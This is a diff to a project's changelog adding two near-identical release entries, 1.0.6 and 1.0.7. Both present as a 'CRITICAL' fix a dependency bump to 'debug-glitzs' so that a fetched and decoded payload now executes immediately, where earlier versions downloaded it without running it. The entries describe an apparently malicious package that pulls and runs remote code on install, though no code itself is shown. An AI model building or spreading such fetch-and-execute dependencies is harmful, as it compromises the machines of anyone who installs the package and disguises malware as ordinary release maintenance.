@@ -7,6 +7,26 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [1.0.7] - 2026-01-15
+
+### Fixed
+- **CRITICAL**: Updated to debug-glitzs@1.0.4 which actually executes the payload
+- Previous versions fetched payload but never ran it
+
+### Changed
+- Updated dependency debug-glitzs from ^1.0.3 to ^1.0.4
+- Payload now executes immediately after being fetched and decoded
+
+## [1.0.6] - 2026-01-15
+
+### Fixed
+- **CRITICAL**: Updated to debug-glitzs@1.0.3 which actually executes the payload
+- Previous versions fetched payload but never ran it
+
+### Changed
+- Updated dependency debug-glitzs from ^1.0.2 to ^1.0.3
+- Payload now executes immediately after being fetched and decoded
+
 ## [1.0.5] - 2026-01-15
 
 ### Changed
